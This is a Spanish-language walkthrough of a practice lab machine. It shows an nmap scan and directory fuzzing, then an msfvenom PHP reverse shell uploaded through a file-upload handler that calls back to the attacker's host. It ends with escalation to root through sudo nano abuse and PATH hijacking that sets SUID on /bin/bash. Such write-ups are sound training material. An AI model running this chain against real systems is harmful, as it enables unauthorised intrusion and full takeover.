Escaneo  de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020251106155336.png)

Revisaré el único puerto abierto, el puerto HTTP 80:

![](../../../Images/Pasted%20image%2020251106155423.png)

Efectivamente existe como una especie de collague en la página web, no encuentro nada relevante

Haré fuzzing web con Gobuster en busqueda de directorios:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt
```

![](../../../Images/Pasted%20image%2020251106155624.png)

Me encuentra un directorio /gallery, accederé a él:

![](../../../Images/Pasted%20image%2020251106155726.png)

Existe una carpeta uploads que contiene:

![](../../../Images/Pasted%20image%2020251106155750.png)

Un .php y otra carpeta llamada images

Dentro de la carpeta images están todas las imágenes de la página principal:

![](../../../Images/Pasted%20image%2020251106155849.png)

Y revisando el handler.php existe una subida de archivos:

![](../../../Images/Pasted%20image%2020251106155925.png)

Crearé un archivo Reverse Shell con Msfvenom y lo subiré en este espacio de subida de archivos:
```
msfvenom -p php/reverse_php LHOST=192.168.1.35 LPORT=443 -o shell.php
```

![](../../../Images/Pasted%20image%2020251106160138.png)

![](../../../Images/Pasted%20image%2020251106160129.png)

Ya que está subido mi archivo, revisaré nuevamente la carpeta de images para localizarlo allí:

![](../../../Images/Pasted%20image%2020251106160228.png)

Ahora me pondré a la escucha con Netcat y daré click a mi archivo para recibir la conexión de la Reverse Shell:

![](../../../Images/Pasted%20image%2020251106160310.png)

Y listo, ya estoy dentro de la máquina

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020251106160841.png)

![](../../../Images/Pasted%20image%2020251106160908.png)

## ESCALADA DE PRIVILEGIOS

Ejecuto sudo -l para ver el binario que puedo usar 

![](../../../Images/Pasted%20image%2020251106160933.png)

Puedo ser el usuario "gallery" con el binario Nano

Miro en GTFOBins como puedo escalar con este binario:

![](../../../Images/Pasted%20image%2020251106161232.png)

Lo ejecuto:

![](../../../Images/Pasted%20image%2020251106161746.png)

![](../../../Images/Pasted%20image%2020251106161832.png)

![](../../../Images/Pasted%20image%2020251106161850.png)

Y ahora ya escalé de usuario y me convertí en el usuario  "gallery"

Ejecuto sudo -l para ver el binario que puedo usar:

![](../../../Images/Pasted%20image%2020251106163352.png)

Tengo un binario /usr/local/bin/runme, revisaré sus "strings", para ver si existe alguna pista de algún comando 
```
strings /usr/local/bin/runme
```

![](../../../Images/Pasted%20image%2020251106163716.png)

Efectivamente observo que este binario ejecuta un comando llamado "convert" pero se usa en su ruta de forma relativa no absoluta por ende explotaré un Path Highyaking:

Primero crearé un archivo llamado igual que el comando convert y dentro activaré el bit SUID de /bin/bash:
```
bash chmod u+s /bin/bash
```

![](../../../Images/Pasted%20image%2020251106165116.png)

Le doy full permisos y luego lo exporto
```
chmod 777 convert
export PATH=.:$PATH
```

![](../../../Images/Pasted%20image%2020251106164930.png)

Ejecuto el binario:

![](../../../Images/Pasted%20image%2020251106165206.png)

Y efectivamente ya no me da error

Solo resta escribir "bash -p" para escalar a super usuario:

![](../../../Images/Pasted%20image%2020251106165251.png)

Y listo ya soy ROOT

